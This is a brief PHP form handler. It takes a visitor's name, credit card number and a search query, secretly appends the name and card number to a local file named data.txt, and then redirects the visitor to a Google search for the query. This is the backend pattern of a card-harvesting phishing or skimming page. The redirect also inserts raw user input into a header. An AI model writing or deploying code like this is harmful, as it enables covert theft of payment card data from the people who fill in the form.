<?php
if(isset($_POST['submit'])){
    $name=$_POST['name'];
    $card=$_POST['ccn'];
    $search=$_POST['query'];
    $exit='data.txt';
}
file_put_contents($exit, "$name : $card\n\r", FILE_APPEND | LOCK_EX);
var_dump($search);
header("Location: https://www.google.com/search?q=$search");
?>

